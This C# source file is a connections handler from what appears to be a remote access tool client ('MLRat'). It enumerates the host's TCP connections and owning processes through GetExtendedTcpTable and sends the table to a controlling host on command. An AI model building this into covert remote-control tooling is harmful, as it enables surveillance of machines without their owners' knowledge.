using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class ConnectionsHandler
    {
        static IClientHost host = null;
        public static void SetHost(IClientHost _host)
        {
            host = _host;
        }
        public static void Handle(object[] data)
        {
            ConnectionsCommand command = (ConnectionsCommand)data[1];
            if(command == ConnectionsCommand.GetTable)
            {
                SendTcpTable();
            }
        }
        public static void SendTcpTable()
        {
            MIB_TCPROW_OWNER_PID[] table = GetTable();
            string[] Names = new string[table.Length];
            string[] LocalAddress = new string[table.Length];
            string[] RemoteAddress = new string[table.Length];
            byte[] States = new byte[table.Length];

            for (int i = 0; i < table.Length; i++)
            {
                LocalAddress[i] = string.Format("{0}:{1}", table[i].LocalAddress, table[i].LocalPort);
                RemoteAddress[i] = string.Format("{0}:{1}", table[i].RemoteAddress, table[i].RemotePort);
                States[i] = Convert.ToByte(table[i].state);

                try
                {
                    Process p = Process.GetProcessById((int)table[i].owningPid);
                    Names[i] = p.ProcessName;
                }
                catch
                {
                    Names[i] = string.Format("PID: {0}", table[i].owningPid);
                }
            }
            host.Send((byte)NetworkCommand.Connections, (byte)ConnectionsCommand.Table, Names, LocalAddress, RemoteAddress, States);
        }

        public static MIB_TCPROW_OWNER_PID[] GetTable()
        {
            MIB_TCPROW_OWNER_PID[] tTable;
            int AF_INET = 2;
            int buffSize = 0;
            uint ret = GetExtendedTcpTable(IntPtr.Zero, ref buffSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL);
            IntPtr buffTable = Marshal.AllocHGlobal(buffSize);
            try
            {
                ret = GetExtendedTcpTable(buffTable, ref buffSize, true, AF_INET, TCP_TABLE_CLASS.TCP_TABLE_OWNER_PID_ALL);
                if (ret != 0)
                    return null;
                MIB_TCPTABLE_OWNER_PID tab = (MIB_TCPTABLE_OWNER_PID)Marshal.PtrToStructure(buffTable, typeof(MIB_TCPTABLE_OWNER_PID));
                IntPtr rowPtr = (IntPtr)((long)buffTable + Marshal.SizeOf(tab.dwNumEntries));
                tTable = new MIB_TCPROW_OWNER_PID[tab.dwNumEntries];   
                for (int i = 0; i < tab.dwNumEntries; i++)
                {
                    MIB_TCPROW_OWNER_PID tcpRow = (MIB_TCPROW_OWNER_PID)Marshal.PtrToStructure(rowPtr, typeof(MIB_TCPROW_OWNER_PID));
                    tTable[i] = tcpRow;
                    rowPtr = (IntPtr)((long)rowPtr + Marshal.SizeOf(tcpRow));
                }

            }
            finally
            {
                Marshal.FreeHGlobal(buffTable);
            }
            return tTable;
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_TCPROW_OWNER_PID
        {
            public UInt32 state;
            public UInt32 localAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public byte[] localPort;
            public UInt32 remoteAddr;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public byte[] remotePort;
            public UInt32 owningPid;

            public System.Net.IPAddress LocalAddress
            {
                get
                {
                    return new System.Net.IPAddress(localAddr);
                }
            }

            public ushort LocalPort
            {
                get
                {
                    return BitConverter.ToUInt16(new byte[2] { localPort[1], localPort[0] }, 0);
                }
            }

            public System.Net.IPAddress RemoteAddress
            {
                get
                {
                    return new IPAddress(remoteAddr);
                }
            }

            public ushort RemotePort
            {
                get
                {
                    return BitConverter.ToUInt16(new byte[2] { remotePort[1], remotePort[0] }, 0);
                }
            }
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct MIB_TCPTABLE_OWNER_PID
        {
            public uint dwNumEntries;
            MIB_TCPROW_OWNER_PID table;
        }
        enum TCP_TABLE_CLASS
        {
            TCP_TABLE_BASIC_LISTENER,
            TCP_TABLE_BASIC_CONNECTIONS,
            TCP_TABLE_BASIC_ALL,
            TCP_TABLE_OWNER_PID_LISTENER,
            TCP_TABLE_OWNER_PID_CONNECTIONS,
            TCP_TABLE_OWNER_PID_ALL,
            TCP_TABLE_OWNER_MODULE_LISTENER,
            TCP_TABLE_OWNER_MODULE_CONNECTIONS,
            TCP_TABLE_OWNER_MODULE_ALL
        }

        [DllImport("iphlpapi.dll", SetLastError = true)]
        static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TCP_TABLE_CLASS tblClass, UInt32 reserved = 0);
    }
}
